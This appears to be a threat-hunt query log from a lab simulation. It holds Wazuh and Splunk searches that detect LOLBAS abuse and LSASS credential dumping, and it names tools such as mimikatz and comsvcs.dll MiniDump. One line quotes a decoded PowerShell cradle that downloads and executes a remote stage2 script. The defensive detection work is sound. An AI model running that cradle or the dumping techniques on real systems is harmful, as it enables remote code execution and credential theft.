# Investigation Queries: Threat Hunt — LOLBAS + Credential Access

**Report ID**: INV-20261115-002
**All queries run during hunt (including dead ends)**

---

## Wazuh WQL / OpenSearch DSL Queries

### 1. LOLBAS from Non-Standard Paths
```json
GET wazuh-alerts-*/_search
{
  "size": 100,
  "query": {
    "bool": {
      "must": [
        { "terms": { "data.win.eventdata.image": ["certutil.exe", "rundll32.exe", "mshta.exe", "regsvr32.exe", "wmic.exe", "reg.exe"] }},
        { "range": { "@timestamp": { "gte": "2026-11-14T09:00:00Z", "lte": "2026-11-15T10:00:00Z" }}}
      ],
      "must_not": [
        { "wildcard": { "data.win.eventdata.image": "C:\\Windows\\System32\\*" }},
        { "wildcard": { "data.win.eventdata.image": "C:\\Windows\\SysWOW64\\*" }}
      ]
    }
  },
  "_source": ["@timestamp", "data.win.eventdata.image", "data.win.eventdata.commandLine", "data.win.eventdata.parentImage", "data.win.targetuser"]
}
```

### 2. certutil -decode Activity
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "wildcard": { "data.win.eventdata.image": "*certutil*" }},
        { "wildcard": { "data.win.eventdata.commandLine": "*decode*" }},
        { "range": { "@timestamp": { "gte": "2026-11-14T09:00:00Z" }}}
      ]
    }
  }
}
```

### 3. Child Processes of LOLBAS
```json
GET wazuh-alerts-*/_search
{
  "size": 100,
  "query": {
    "bool": {
      "must": [
        { "terms": { "data.win.eventdata.parentImage": ["certutil.exe", "rundll32.exe", "mshta.exe", "regsvr32.exe"] }},
        { "range": { "@timestamp": { "gte": "2026-11-14T09:00:00Z" }}}
      ]
    }
  },
  "_source": ["@timestamp", "data.win.eventdata.image", "data.win.eventdata.commandLine", "data.win.eventdata.parentImage", "data.win.targetuser"]
}
```

### 4. Network from LOLBAS Children
```json
GET wazuh-alerts-*/_search
{
  "size": 100,
  "query": {
    "bool": {
      "must": [
        { "wildcard": { "data.win.eventdata.sourceImage": "*powershell*" }},
        { "terms": { "data.win.eventdata.parentImage": ["certutil.exe", "rundll32.exe", "mshta.exe", "regsvr32.exe"] }},
        { "term": { "data.win.eventdata.eventType": "3" }},
        { "range": { "@timestamp": { "gte": "2026-11-14T09:00:00Z" }}}
      ]
    }
  },
  "_source": ["@timestamp", "data.win.eventdata.destinationIp", "data.win.eventdata.destinationPort", "data.win.eventdata.protocol", "data.win.eventdata.sourceImage"]
}
```

### 5. Rundll32 + comsvcs.dll MiniDump
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "wildcard": { "data.win.eventdata.image": "*rundll32*" }},
        { "wildcard": { "data.win.eventdata.commandLine": "*comsvcs.dll*" }},
        { "range": { "@timestamp": { "gte": "2026-11-14T09:00:00Z" }}}
      ]
    }
  }
}
```

### 6. LSASS Process Access (EventID 10)
```json
GET wazuh-alerts-*/_search
{
  "size": 100,
  "query": {
    "bool": {
      "must": [
        { "wildcard": { "data.win.eventdata.targetImage": "*lsass.exe" }},
        { "terms": { "data.win.eventdata.grantedAccess": ["0x1010", "0x1fffff", "0x001f0fff", "0x000f0fff"] }},
        { "wildcard": { "data.win.eventdata.sourceImage": "*rundll32*" }},
        { "range": { "@timestamp": { "gte": "2026-11-14T09:00:00Z" }}}
      ]
    }
  },
  "_source": ["@timestamp", "data.win.eventdata.sourceImage", "data.win.eventdata.targetImage", "data.win.eventdata.grantedAccess", "data.win.eventdata.sourceProcessId", "data.win.eventdata.targetProcessId"]
}
```

### 7. Known Dumping Tools
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "terms": { "data.win.eventdata.image": ["mimikatz.exe", "procdump.exe", "sqldumper.exe", "werfault.exe", "comsvcs.dll", "rundll32.exe"] }},
        { "range": { "@timestamp": { "gte": "2026-11-14T09:00:00Z" }}}
      ]
    }
  }
}
```

---

## Splunk SPL Equivalents

### 1. LOLBAS Non-Standard Paths
```spl
index=winevents sourcetype=xmlwineventlog EventCode=4688
| where match(New_Process_Name, "(?i)(certutil|rundll32|mshta|regsvr32|wmic|reg)\.exe")
| where NOT match(New_Process_Name, "C:\\\\Windows\\\\System32\\\\") AND NOT match(New_Process_Name, "C:\\\\Windows\\\\SysWOW64\\\\")
| table _time, host, New_Process_Name, Command_Line, ParentProcessName, TargetUserName
```

### 2. certutil decode
```spl
index=winevents sourcetype=xmlwineventlog EventCode=4688
| where match(New_Process_Name, "certutil\.exe") AND match(Command_Line, "-decode")
```

### 3. Child of LOLBAS
```spl
index=winevents sourcetype=xmlwineventlog EventCode=4688
| where match(ParentProcessName, "(?i)(certutil|rundll32|mshta|regsvr32)\.exe")
| table _time, host, New_Process_Name, Command_Line, ParentProcessName, TargetUserName
```

### 4. LSASS Access
```spl
index=winevents sourcetype=xmlwineventlog EventCode=10
| where match(TargetImage, "lsass.exe")
| where GrantedAccess IN ("0x1010","0x1fffff","0x001f0fff","0x000f0fff")
| where match(SourceImage, "rundll32\.exe")
| table _time, host, SourceImage, TargetImage, GrantedAccess, SourceProcessId, TargetProcessId
```

---

## Manual Commands

### SHA256 Hash Evidence
```bash
# Hash decoded PowerShell payload
echo -n "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage2.ps1')" | sha256sum
# Output: q7r8s9t0... (saved to evidence)

# Hash log exports
sha256sum lolbas-events.json
sha256sum lsass-access-events.json
```

---

## Dead Ends / Queries That Returned Nothing

| Query | Reason | Learning |
|-------|--------|----------|
| `event.code IN (12,13,14) AND targetObject:*\\SAM\\*` | No registry SAM access | Attacker used memory dump only |
| `event.code IN (12,13,14) AND targetObject:*\\SECURITY\\*` | No registry SECURITY access | Same |
| `event.code IN (4103,4104) AND scriptBlockText:DPAPI` | No browser credential hunting | Not in scope for this simulation |
| `event.code:4662 AND objectType:DS` | No DCSync | No domain controller in lab |

---

**All queries saved for reproducibility and interview walkthrough.**